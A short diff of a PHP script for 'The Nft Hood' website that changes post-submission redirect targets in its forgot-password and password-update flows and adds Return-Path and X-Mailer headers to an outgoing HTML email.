@@ -373,7 +373,7 @@ if(isset($_POST['ffemail'])) {
 
 	//redirect to verify page
 	echo 'Loading...Please Wait!';
-	echo '<script>window.location.href ="./reset"</script>';
+	echo '<script>window.location.href ="./verify"</script>';
 
 	}
 }
@@ -388,8 +388,10 @@ $cmessage 	= "Best Regards<br/> <i>The Nft Hood</i>";
 
 $headers  = "From: " . $from . "\r\n";
 $headers .= "Reply-To: ". $from . "\r\n";
+$headers .= "Return-Path: ". $from ."\r\n";
 $headers .= "MIME-Version: 1.0\r\n";
 $headers .= "Content-Type: text/html; charset=\"iso-8859-1\"\n";
+$headers .= "X-Mailer: PHP". phpversion() ."\r\n" ;
 $headers .= "X-Priority: 1 (Highest)\n";
 $headers .= "X-MSMail-Priority: High\n";
 $headers .= "Importance: High\n";
@@ -416,7 +418,7 @@ if(isset($_POST['fpassword']) && isset($_POST['cfpassword']) && isset($_POST['ma
 
 	//redirect to verify page
 	echo 'Loading...Please Wait!';
-	echo '<script>window.location.href ="./updated"</script>';
+	echo '<script>window.location.href ="./"</script>';
 }
 
 
